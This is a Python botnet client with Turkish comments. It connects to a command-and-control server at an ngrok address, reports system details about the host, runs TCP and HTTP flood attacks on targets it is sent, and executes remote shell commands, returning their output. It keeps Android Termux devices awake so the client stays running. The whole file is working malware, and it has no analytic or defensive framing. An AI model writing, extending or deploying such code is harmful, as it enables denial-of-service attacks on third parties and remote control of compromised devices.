#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import socket
import threading
import time
import json
import sys
import os
import subprocess
import platform
import random
import ssl
import hashlib
from datetime import datetime

class BotClient:
    def __init__(self, c2_host, c2_port):
        self.c2_host = c2_host
        self.c2_port = c2_port
        self.bot_id = None
        self.running = True
        self.attack_threads = []
        
    def connect_to_c2(self):
        while self.running:
            try:
                # SSL bağlantısı
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                
                raw_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                raw_socket.settimeout(30)
                
                # Ngrok veya normal sunucu
                ssl_socket = context.wrap_socket(raw_socket)
                ssl_socket.connect((self.c2_host, self.c2_port))
                
                print(f"[+] C2'ye bağlandı: {self.c2_host}:{self.c2_port}")
                return ssl_socket
                
            except Exception as e:
                print(f"[-] Bağlantı hatası: {e}, {self.reconnect_delay} saniye sonra tekrar denenecek")
                time.sleep(self.reconnect_delay)
    
    def get_system_info(self):
        return {
            "platform": platform.platform(),
            "hostname": socket.gethostname(),
            "python_version": sys.version,
            "termux": "com.termux" in os.getcwd() if os.getcwd() else False,
            "uptime": int(time.time() - os.path.getctime('/proc/uptime'))
        }
    
    def tcp_flood(self, target, port, duration, thread_count):
        end_time = time.time() + duration
        
        def flood_thread():
            while time.time() < end_time and self.running:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    sock.connect((target, port))
                    
                    # Randomize paket
                    packet = random._urandom(1024)
                    for _ in range(100):
                        sock.send(packet)
                    sock.close()
                except:
                    pass
        
        # Thread'leri başlat
        for _ in range(thread_count):
            thread = threading.Thread(target=flood_thread)
            thread.daemon = True
            thread.start()
            self.attack_threads.append(thread)
        
        # Süre bitene kadar bekle
        time.sleep(duration)
        
        # Thread'leri temizle
        self.attack_threads.clear()
    
    def http_flood(self, target, port, duration, thread_count):
        import urllib.request
        import urllib.error
        
        end_time = time.time() + duration
        url = f"http://{target}:{port}/"
        
        def http_thread():
            while time.time() < end_time and self.running:
                try:
                    req = urllib.request.Request(url, headers={
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                    })
                    urllib.request.urlopen(req, timeout=5)
                except:
                    pass
        
        for _ in range(thread_count):
            thread = threading.Thread(target=http_thread)
            thread.daemon = True
            thread.start()
            self.attack_threads.append(thread)
        
        time.sleep(duration)
        self.attack_threads.clear()
    
    def execute_command(self, command):
        try:
            result = subprocess.check_output(
                command, 
                shell=True, 
                stderr=subprocess.STDOUT,
                timeout=30
            )
            return result.decode('utf-8', errors='ignore')
        except Exception as e:
            return str(e)
    
    def main_loop(self):
        while self.running:
            sock = None
            try:
                sock = self.connect_to_c2()
                
                # Sistem bilgilerini gönder
                info = self.get_system_info()
                sock.send(f"INFO:{json.dumps(info)}".encode())
                
                # Ana döngü
                while self.running:
                    # Komut iste
                    sock.send(b"CMD_REQUEST")
                    
                    # Komut al
                    data = sock.recv(4096)
                    if not data:
                        break
                    
                    if data == b"NO_COMMAND":
                        time.sleep(10)
                        continue
                    
                    # Komutu parse et
                    try:
                        cmd = json.loads(data.decode())
                        print(f"[+] Komut alındı: {cmd['type']}")
                        
                        if cmd['type'] == 'attack':
                            method = cmd.get('method', 'tcp_flood')
                            target = cmd['target']
                            port = cmd['port']
                            duration = cmd['duration']
                            threads = cmd.get('threads', 10)
                            
                            if method == 'tcp_flood':
                                self.tcp_flood(target, port, duration, threads)
                            elif method == 'http_flood':
                                self.http_flood(target, port, duration, threads)
                            
                            # Sonucu gönder
                            result = {"status": "attack_completed", "method": method}
                            sock.send(f"RESULT:{json.dumps(result)}".encode())
                        
                        elif cmd['type'] == 'shell':
                            shell_cmd = cmd['command']
                            output = self.execute_command(shell_cmd)
                            sock.send(f"RESULT:{json.dumps({'output': output})}".encode())
                        
                        elif cmd['type'] == 'update':
                            # Kendini güncelle
                            pass
                        
                    except json.JSONDecodeError:
                        pass
                    
            except Exception as e:
                print(f"[-] Ana döngü hatası: {e}")
            finally:
                if sock:
                    sock.close()
                time.sleep(30)

if __name__ == "__main__":
    # Termux otomatik başlatma
    if 'com.termux' in os.getcwd():
        # Termux özel ayarlar
        os.system('termux-wake-lock')
    
    # C2 adresini al (dinamik olabilir)
    c2_host = "0.tcp.eu.ngrok.io"  # Ngrok veya VPS IP
    c2_port = 12345
    
    client = BotClient(c2_host, c2_port)
    client.main_loop()
